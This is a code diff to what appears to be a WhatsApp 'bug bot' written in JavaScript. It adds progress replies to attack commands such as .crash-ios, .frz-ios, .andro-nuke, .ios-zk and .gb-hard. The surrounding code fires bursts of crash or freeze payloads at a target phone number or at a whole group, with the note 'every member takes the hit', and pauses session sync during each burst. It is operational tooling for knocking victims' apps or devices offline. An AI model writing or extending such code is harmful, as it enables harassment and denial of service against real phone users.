@@ -5066,6 +5066,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* If lookup is unavailable on the test transport, try the one send. */ }
 
+        await safeWaReply(sock, remoteJid, `⏳ .crash-ios sending → ${targetNumber}…`, msg);
         try {
             const result = await sendIozkProbe(sock, targetJid);
             recordBugSends(phoneNumber, targetJid, result?.ids || []);
@@ -5127,6 +5128,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* If lookup is unavailable on the test transport, try the one send. */ }
 
+        await safeWaReply(sock, remoteJid, `⏳ .frz-ios sending → ${targetNumber}…`, msg);
         try {
             const result = await sendFiosProbe(sock, targetJid);
             recordBugSends(phoneNumber, targetJid, result?.ids || []);
@@ -5188,6 +5190,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* lookup failed — try the send anyway */ }
 
+        await safeWaReply(sock, remoteJid, `⏳ .${dKind} started — ×${dCount} → ${dTargetNumber} (≈${Math.max(1, Math.ceil(dCount * 1.5 / 60))} min). I'll reply again when done.`, msg);
         // Pause Supabase session sync for the burst (same as .crash-hard/.frz-oom).
         const dSyncPause = isSupabaseEnabled();
         if (dSyncPause) setSyncPaused(true);
@@ -5271,6 +5274,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             }
         } catch (_) { /* lookup failed — try the send anyway */ }
 
+        await safeWaReply(sock, remoteJid, `⏳ .andro-nuke started — ${cmRounds} round(s) ×10 → ${cmTargetNumber} (≈${Math.max(1, Math.ceil(cmRounds * 11 / 60))} min). I'll reply again when done.`, msg);
         // Pause Supabase session sync for the burst (same as .crash-hard/.frz-oom).
         const cmSyncPause = isSupabaseEnabled();
         if (cmSyncPause) setSyncPaused(true);
@@ -5349,6 +5353,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         } catch (_) {}
         log('TEST', `${phoneNumber}: .ios-zk start → ${zkTargetJid} (thumb ${zkThumb.length}B)`);
 
+        await safeWaReply(sock, remoteJid, `⏳ .ios-zk sending → ${zkNumber} (60 payloads, ≈1–2 min)…`, msg);
         const zkSyncPause = isSupabaseEnabled();
         if (zkSyncPause) setSyncPaused(true);
         try {
@@ -5429,6 +5434,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             return;
         }
 
+        await safeWaReply(sock, remoteJid, '⏳ .gb started — CrashClick ×10 → group…', msg);
         let gbSent = 0;
         const gbIds = [];
         for (let i = 0; i < 10; i++) {
@@ -5509,6 +5515,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
         const gbhSyncPause = isSupabaseEnabled();
         if (gbhSyncPause) setSyncPaused(true);
+        await safeWaReply(sock, remoteJid, `⏳ .gb-hard started — app-level ×${gbhCount} → group (every member takes the hit). I'll reply again when done.`, msg);
         let gbhSent = 0, gbhWire = 0;
         const gbhIds = [];
         try {
@@ -7647,6 +7654,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
 
             const fire = payloadKind === 'testfff' ? testfff : androz;
 
+            await safeWaReply(sock, remoteJid, `⏳ .${displayKind}${fffMode} started — ×${count} → ${targetJid.split('@')[0]} (≈${Math.max(1, Math.ceil(count * 2.1 / 60))} min). I'll reply again when done.`, msg);
             // Pause Supabase session sync for the burst — every send ratchets
             // crypto keys and would otherwise re-trigger full-folder uploads
             // (thousands of files) between sends. Resumed in finally(), which
